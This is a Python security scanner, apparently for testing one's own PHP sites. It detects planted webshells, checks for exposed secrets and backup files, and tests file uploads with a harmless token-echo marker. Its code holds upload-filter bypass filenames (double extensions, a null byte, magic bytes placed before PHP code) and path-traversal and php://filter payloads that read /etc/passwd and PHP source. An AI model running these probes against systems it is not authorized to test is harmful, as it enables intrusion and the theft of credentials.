#!/usr/bin/env python3
"""
php2shell-scan — authorized PoC scanner for your own PHP sites.

Covers four checks against hosts YOU own and pass in explicitly:
  1. webshell     — probe common webshell paths/names, match tell-tale signatures
  2. uploads      — (opt-in) test an upload endpoint for extension/content-type
                    bypasses using a BENIGN marker payload, never a real shell
  3. lfi          — read-only LFI / wrapper probes, signature-matched
  4. exposure     — phpinfo, .env, config backups, leftover dev/test PHP, and a
                    PHP-version / session.upload_progress hygiene note

Design rules:
  * Non-destructive. Detection modules only GET and match. The upload module
    writes a harmless token-echo file so a hit PROVES the flaw without leaving
    anything weaponized; use --cleanup hints in the report to remove it.
  * Scoped. Only hosts given on the command line are touched.
  * Rate-limited (--delay) and clearly logged.

Only run this against infrastructure you are authorized to test.

Usage:
  python scanner.py https://interdo.me
  python scanner.py https://a.example https://b.example --only webshell,exposure
  python scanner.py https://site --upload-url https://site/upload.php --upload-field file
"""
from __future__ import annotations

import argparse
import concurrent.futures as cf
import random
import re
import string
import sys
import time
from dataclasses import dataclass, field
from typing import Callable, Iterable
from urllib.parse import urljoin, urlparse

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    sys.exit("This tool needs 'requests'.  Install it with:  pip install requests")


# --------------------------------------------------------------------------- #
# config / plumbing
# --------------------------------------------------------------------------- #

USER_AGENT = "php2shell-scan/1.0 (authorized self-test)"
TIMEOUT = 12

SEV_HIGH, SEV_MED, SEV_LOW, SEV_INFO = "HIGH", "MEDIUM", "LOW", "INFO"
SEV_ORDER = {SEV_HIGH: 0, SEV_MED: 1, SEV_LOW: 2, SEV_INFO: 3}


@dataclass
class Finding:
    target: str
    module: str
    severity: str
    title: str
    url: str = ""
    evidence: str = ""


@dataclass
class Ctx:
    session: requests.Session
    delay: float
    verbose: bool
    findings: list[Finding] = field(default_factory=list)

    def get(self, url: str, **kw):
        time.sleep(self.delay)
        kw.setdefault("timeout", TIMEOUT)
        kw.setdefault("allow_redirects", True)
        try:
            r = self.session.get(url, **kw)
            if self.verbose:
                print(f"    GET {r.status_code} {url}")
            return r
        except requests.RequestException as e:
            if self.verbose:
                print(f"    GET ERR {url}  ({e})")
            return None

    def post(self, url: str, **kw):
        time.sleep(self.delay)
        kw.setdefault("timeout", TIMEOUT)
        try:
            r = self.session.post(url, **kw)
            if self.verbose:
                print(f"    POST {r.status_code} {url}")
            return r
        except requests.RequestException as e:
            if self.verbose:
                print(f"    POST ERR {url}  ({e})")
            return None

    def add(self, f: Finding):
        self.findings.append(f)
        print(f"  [{f.severity:<6}] {f.module:<9} {f.title}"
              + (f"  -> {f.url}" if f.url else ""))


def make_session() -> requests.Session:
    s = requests.Session()
    s.headers["User-Agent"] = USER_AGENT
    retry = Retry(total=2, backoff_factor=0.3,
                  status_forcelist=(502, 503, 504), allowed_methods=False)
    s.mount("https://", HTTPAdapter(max_retries=retry))
    s.mount("http://", HTTPAdapter(max_retries=retry))
    return s


def token(n: int = 16) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


# --------------------------------------------------------------------------- #
# module 1 — planted webshell detection
# --------------------------------------------------------------------------- #

WEBSHELL_PATHS = [
    "shell.php", "c99.php", "c100.php", "r57.php", "wso.php", "b374k.php",
    "alfa.php", "indoxploit.php", "mini.php", "cmd.php", "up.php", "upload.php",
    "adminer.php", "backdoor.php", "x.php", "0.php", "1.php", "a.php",
    "wp-content/uploads/shell.php", "images/shell.php", "uploads/cmd.php",
    "assets/up.php", "tmp/shell.php", "css/shell.php",
]

# signatures that strongly suggest a shell is present in the response body
WEBSHELL_SIGS = [
    (re.compile(r"\bFilesMan\b"), "FilesMan panel (WSO/b374k family)"),
    (re.compile(r"c99shell|r57shell|b374k|WSO\s*\d|IndoXploit|AlfaTeam",
                re.I), "named webshell banner"),
    (re.compile(r"Safe[\s_-]*mode\s*:.*(ON|OFF)", re.I), "shell sysinfo block"),
    (re.compile(r"<title>[^<]*\b(shell|c99|r57|bypass|priv8)\b", re.I),
     "shell-ish page title"),
    (re.compile(r"\buname\s*-a\b.*<"), "command-output scaffolding"),
]


def mod_webshell(ctx: Ctx, base: str):
    for p in WEBSHELL_PATHS:
        url = urljoin(base + "/", p)
        r = ctx.get(url)
        if not r or r.status_code != 200 or not r.text:
            continue
        for rx, label in WEBSHELL_SIGS:
            m = rx.search(r.text)
            if m:
                ctx.add(Finding(base, "webshell", SEV_HIGH,
                                f"Possible planted webshell ({label})",
                                url, m.group(0)[:120]))
                break
        else:
            # a 200 on a classic shell name with a form is at least suspicious
            if re.search(r"<form[^>]*method=['\"]?post", r.text, re.I) \
                    and len(r.text) < 60000:
                ctx.add(Finding(base, "webshell", SEV_MED,
                                "Suspicious PHP file responds with a POST form",
                                url, f"{len(r.text)} bytes"))


# --------------------------------------------------------------------------- #
# module 2 — upload-to-shell (opt-in, benign marker)
# --------------------------------------------------------------------------- #

# Each tuple: (filename, content-type) — ordered least to most aggressive.
# The payload below only ECHOES a random token; it is not a usable shell.
def upload_variants(tok: str):
    marker = f"<?php echo 'P2S-{tok}'; ?>"  # benign: prints a token, nothing else
    plain = f"P2S-{tok}"
    return [
        ("poc.php", "application/x-php", marker),
        ("poc.php", "image/jpeg", marker),                 # content-type lie
        ("poc.pHp", "image/jpeg", marker),                 # case
        ("poc.php.jpg", "image/jpeg", marker),             # double ext (reverse)
        ("poc.jpg.php", "image/jpeg", marker),             # double ext
        ("poc.phtml", "image/jpeg", marker),               # alt php ext
        ("poc.php5", "image/jpeg", marker),
        ("poc.phar", "image/jpeg", marker),
        ("poc.php%00.jpg", "image/jpeg", marker),          # legacy null byte
        ("poc.jpg", "image/jpeg", "\xff\xd8\xff\xe0" + marker),  # magic bytes + php
        ("poc.jpg", "image/jpeg", plain),                  # control: plain text
    ]


# dirs an uploaded file commonly lands in, relative to site root
UPLOAD_GUESS_DIRS = [
    "uploads/", "upload/", "files/", "media/", "images/", "img/", "assets/",
    "wp-content/uploads/", "tmp/", "data/", "userfiles/", "",
]


def mod_upload(ctx: Ctx, base: str, upload_url: str, field: str,
               extra: dict[str, str] | None):
    tok = token()
    expect = f"P2S-{tok}"
    print(f"  upload marker token: {expect}")
    for fname, ctype, body in upload_variants(tok):
        files = {field: (fname, body.encode("latin-1", "ignore"), ctype)}
        r = ctx.post(upload_url, files=files, data=(extra or {}))
        if not r:
            continue
        # try to learn where it landed from the response, else guess
        landed = find_uploaded_url(ctx, base, r, fname)
        for cand in landed:
            rr = ctx.get(cand)
            if not rr or not rr.text:
                continue
            if expect in rr.text and "<?php" not in rr.text:
                ctx.add(Finding(base, "uploads", SEV_HIGH,
                                f"Uploaded PHP EXECUTED via '{fname}' bypass",
                                cand, f"echoed {expect}"))
                print(f"    !! remove this file from the server: {cand}")
                return  # proven; stop hammering the endpoint
            if expect in rr.text and "<?php" in rr.text:
                ctx.add(Finding(base, "uploads", SEV_MED,
                                f"'{fname}' stored & served (not executed)",
                                cand, "source returned verbatim"))


def find_uploaded_url(ctx: Ctx, base: str, resp, fname: str) -> list[str]:
    cands: list[str] = []
    # 1. a URL or path echoed in the upload response
    for m in re.finditer(r"""(?:https?://[^\s"'<>]+|/[^\s"'<>]+)"""
                         + re.escape(fname.split("%")[0]), resp.text):
        cands.append(urljoin(base, m.group(0)))
    # 2. fall back to guessing standard upload dirs
    stem = fname.split("%")[0]
    for d in UPLOAD_GUESS_DIRS:
        cands.append(urljoin(base + "/", d + stem))
    # de-dup, keep order
    seen, out = set(), []
    for c in cands:
        if c not in seen:
            seen.add(c)
            out.append(c)
    return out[:12]


# --------------------------------------------------------------------------- #
# module 3 — LFI / wrapper (read-only)
# --------------------------------------------------------------------------- #

LFI_PARAMS = ["page", "file", "path", "include", "inc", "view", "tpl",
              "template", "lang", "doc", "document", "load", "read", "p"]

LFI_PAYLOADS = [
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
]

PASSWD_RX = re.compile(r"root:.*:0:0:")
B64_PHP_RX = re.compile(r"PD9waHA|PCFET0NUWVBF")  # base64 of "<?php" / "<!DOCTYP"


def mod_lfi(ctx: Ctx, base: str):
    for param in LFI_PARAMS:
        for payload in LFI_PAYLOADS:
            url = f"{base}/?{param}={payload}"
            r = ctx.get(url)
            if not r or not r.text:
                continue
            if PASSWD_RX.search(r.text):
                ctx.add(Finding(base, "lfi", SEV_HIGH,
                                f"LFI: /etc/passwd via ?{param}=",
                                url, "root:...:0:0:"))
            elif "php://filter" in payload and B64_PHP_RX.search(r.text):
                ctx.add(Finding(base, "lfi", SEV_HIGH,
                                f"LFI: php://filter leaks PHP source via ?{param}=",
                                url, "base64 of PHP returned"))


# --------------------------------------------------------------------------- #
# module 4 — exposure (phpinfo, env, backups, dev files, version hygiene)
# --------------------------------------------------------------------------- #

EXPOSURE_PATHS = {
    "phpinfo.php": ("phpinfo exposed", SEV_MED),
    "info.php": ("phpinfo exposed", SEV_MED),
    "test.php": ("leftover dev/test PHP", SEV_LOW),
    "temp.php": ("leftover dev/test PHP", SEV_LOW),
    ".env": ("environment file exposed", SEV_HIGH),
    ".env.bak": ("environment backup exposed", SEV_HIGH),
    "config.php.bak": ("config backup exposed", SEV_HIGH),
    "config.php~": ("config backup exposed", SEV_HIGH),
    "wp-config.php.bak": ("wp-config backup exposed", SEV_HIGH),
    ".git/config": ("exposed .git repo", SEV_HIGH),
    "composer.json": ("composer.json exposed", SEV_LOW),
    "adminer.php": ("Adminer DB tool exposed", SEV_MED),
    "phpmyadmin/": ("phpMyAdmin exposed", SEV_MED),
    "server-status": ("Apache server-status exposed", SEV_MED),
    ".DS_Store": ("directory listing leak (.DS_Store)", SEV_LOW),
}

PHPINFO_RX = re.compile(r"phpinfo\(\)|PHP Version\s*</td>|<title>phpinfo", re.I)
PHP_VER_HDR = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)")
# PHP branches EOL as of 2026; adjust as needed
EOL_BRANCHES = {(5, x) for x in range(7)} | {(7, x) for x in range(5)} \
    | {(8, 0), (8, 1)}


def mod_exposure(ctx: Ctx, base: str):
    for p, (title, sev) in EXPOSURE_PATHS.items():
        url = urljoin(base + "/", p)
        r = ctx.get(url)
        if not r or r.status_code != 200 or not r.text:
            continue
        body = r.text
        if p in ("phpinfo.php", "info.php") and not PHPINFO_RX.search(body):
            continue  # a generic 200 isn't a real phpinfo
        if p == ".env" and "=" not in body:
            continue
        if p == ".git/config" and "[core]" not in body:
            continue
        ctx.add(Finding(base, "exposure", sev, title, url,
                        body.strip().splitlines()[0][:100] if body.strip() else ""))

    # version / header hygiene (the one verifiable idea worth keeping from the
    # referenced write-up: old PHP + session.upload_progress surface area)
    r = ctx.get(base + "/")
    if r:
        hdr = r.headers.get("X-Powered-By", "") + " " + r.headers.get("Server", "")
        m = PHP_VER_HDR.search(hdr)
        if m:
            major, minor, patch = map(int, m.groups())
            note = f"PHP {major}.{minor}.{patch} advertised in headers"
            if (major, minor) in EOL_BRANCHES:
                ctx.add(Finding(base, "exposure", SEV_MED,
                                f"End-of-life PHP branch ({major}.{minor})",
                                base, note + " — no security fixes"))
            else:
                ctx.add(Finding(base, "exposure", SEV_INFO,
                                "PHP version disclosed in headers", base, note))
            ctx.add(Finding(base, "exposure", SEV_INFO,
                            "Check session.upload_progress.enabled on this host",
                            base, "php -i | grep upload_progress  (disable if unused)"))


# --------------------------------------------------------------------------- #
# driver
# --------------------------------------------------------------------------- #

MODULES: dict[str, Callable] = {
    "webshell": mod_webshell,
    "lfi": mod_lfi,
    "exposure": mod_exposure,
}


def scan_target(ctx: Ctx, base: str, only: set[str], upload_cfg):
    base = base.rstrip("/")
    print(f"\n=== {base} ===")
    if not urlparse(base).scheme:
        print("  skip: target needs a scheme (http:// or https://)")
        return
    for name, fn in MODULES.items():
        if only and name not in only:
            continue
        print(f"  -- {name}")
        fn(ctx, base)
    if (not only or "uploads" in only) and upload_cfg:
        print("  -- uploads")
        mod_upload(ctx, base, upload_cfg["url"], upload_cfg["field"],
                   upload_cfg.get("extra"))


def parse_extra(pairs: Iterable[str]) -> dict[str, str]:
    out = {}
    for p in pairs or []:
        if "=" in p:
            k, v = p.split("=", 1)
            out[k] = v
    return out


def main():
    ap = argparse.ArgumentParser(description="Authorized php2shell PoC scanner")
    ap.add_argument("targets", nargs="+", help="base URLs you own, e.g. https://interdo.me")
    ap.add_argument("--only", help="comma list: webshell,uploads,lfi,exposure")
    ap.add_argument("--delay", type=float, default=0.4, help="seconds between requests")
    ap.add_argument("--verbose", action="store_true")
    ap.add_argument("--insecure", action="store_true", help="skip TLS verify (self-signed)")
    # upload module (opt-in)
    ap.add_argument("--upload-url", help="upload endpoint to fuzz")
    ap.add_argument("--upload-field", default="file", help="multipart field name")
    ap.add_argument("--upload-extra", nargs="*", help="extra form fields k=v")
    args = ap.parse_args()

    only = set(x.strip() for x in args.only.split(",")) if args.only else set()
    sess = make_session()
    if args.insecure:
        sess.verify = False
        requests.packages.urllib3.disable_warnings()  # type: ignore

    upload_cfg = None
    if args.upload_url:
        upload_cfg = {"url": args.upload_url, "field": args.upload_field,
                      "extra": parse_extra(args.upload_extra)}

    ctx = Ctx(session=sess, delay=args.delay, verbose=args.verbose)

    print("php2shell-scan — authorized self-test only.")
    for t in args.targets:
        scan_target(ctx, t, only, upload_cfg)

    # report
    print("\n" + "=" * 60)
    print(f"SUMMARY — {len(ctx.findings)} finding(s)")
    print("=" * 60)
    for f in sorted(ctx.findings, key=lambda x: (SEV_ORDER[x.severity], x.target)):
        print(f"[{f.severity:<6}] {f.target} :: {f.title}")
        if f.url:
            print(f"           {f.url}")
        if f.evidence:
            print(f"           evidence: {f.evidence}")
    if any(f.severity == SEV_HIGH for f in ctx.findings):
        sys.exit(2)


if __name__ == "__main__":
    main()
